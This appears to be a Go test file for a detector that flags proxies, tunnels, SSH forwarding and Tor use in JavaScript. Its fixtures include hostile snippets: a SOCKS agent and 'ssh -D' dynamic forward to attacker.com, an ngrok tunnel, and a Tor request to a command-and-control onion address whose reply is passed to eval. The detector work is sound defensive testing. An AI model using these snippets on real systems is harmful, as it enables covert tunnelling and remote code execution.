package analyzer

import (
	"strings"
	"testing"
)

func TestSocksProxy_SocksURL(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const agent = new SocksProxyAgent('socks5://127.0.0.1:1080');
const res = await fetch('http://internal-api.corp:8080', { agent });
`
	findings := a.scanContent(content, "proxy.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SOCKS proxy URL") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect SOCKS proxy URL")
	}
}

func TestSocksProxy_SocksLibrary(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const SocksProxy = require('socks-proxy-agent');
const agent = new SocksProxy('socks5://attacker.com:1080');
`
	findings := a.scanContent(content, "agent.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SOCKS proxy library") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect SOCKS proxy library import")
	}
}

func TestSocksProxy_NgrokExecution(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const { execSync } = require('child_process');
execSync('ngrok http 3000');
`
	findings := a.scanContent(content, "tunnel.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Tunneling tool") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect ngrok tunneling tool execution")
	}
}

func TestSocksProxy_SSHDynamicForward(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
exec('ssh -D 1080 -N user@attacker.com');
`
	findings := a.scanContent(content, "sshproxy.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SSH SOCKS proxy") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect SSH SOCKS proxy setup")
	}
}

func TestSocksProxy_SSHLocalForward(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
exec('ssh -L 8080:internal-db.corp:5432 user@jumpbox.com');
`
	findings := a.scanContent(content, "forward.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SSH local port forward") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect SSH local port forward")
	}
}

func TestSocksProxy_TorIntegration(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const tor = require('tor-request');
tor.request('http://c2onionaddress.onion/cmd', (err, res, body) => {
  eval(body);
});
`
	findings := a.scanContent(content, "tor.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Tor") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Tor network integration")
	}
}

func TestSocksProxy_ProxyPortBinding(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const server = net.createServer((socket) => {
  // proxy handler
});
server.listen(1080);
`
	findings := a.scanContent(content, "listen.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "proxy port") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect common proxy port binding")
	}
}

func TestSocksProxy_CleanCode(t *testing.T) {
	a := NewSocksProxyAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/proxy-config', (req, res) => {
  res.json({ configured: false });
});
app.listen(3000);
`
	findings := a.scanContent(content, "config.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
